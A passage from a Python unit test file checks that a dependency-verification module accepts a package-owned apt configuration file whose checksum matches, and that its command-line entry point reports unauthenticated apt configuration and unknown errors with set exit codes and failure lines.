    def test_owner_diagnostic_does_not_change_allowed_checksum_or_other_failure_paths(self):
        path = '/etc/apt/apt.conf.d/20owner'
        content = b'original baseline config'
        status = types.SimpleNamespace(is_file=lambda: True, stat=lambda: types.SimpleNamespace(st_size=100))
        def run(command):
            return 'debconf: ' + path + '\n' if '-S' in command else (
                ' ' + path + ' ' + hashlib.md5(content).hexdigest() + '\n')
        with (mock.patch.object(self.d, 'pathlib', types.SimpleNamespace(Path=pathlib.PurePosixPath)),
              mock.patch.object(self.d, 'dependency_protected', return_value=status),
              mock.patch.object(self.d, 'dependency_tool', lambda name: '/usr/bin/' + name),
              mock.patch.object(self.d, 'dependency_run', run)):
            self.assertIsNone(self.d.dependency_registered(path, {'debconf'}, content))
        for error, code, line in (
                (self.d.DependencyFailure('UNAUTHENTICATED_APT_CONFIGURATION'), 65,
                 'TOOLCHAIN_FAILURE=dependencies:UNAUTHENTICATED_APT_CONFIGURATION\n'),
                (OSError('PRIVATE_ERROR'), 70, 'TOOLCHAIN_FAILURE=unknown:DEPENDENCY_STATE_UNCONFIRMED\n')):
            stream = io.StringIO()
            with mock.patch.object(self.d, 'dependency_main', side_effect=error), contextlib.redirect_stdout(stream):
                self.assertEqual(code, self.d.dependency_cli(['NATIVE_BUILD', OPERATION]))
            self.assertEqual(line, stream.getvalue())


if __name__ == '__main__':
    unittest.main()
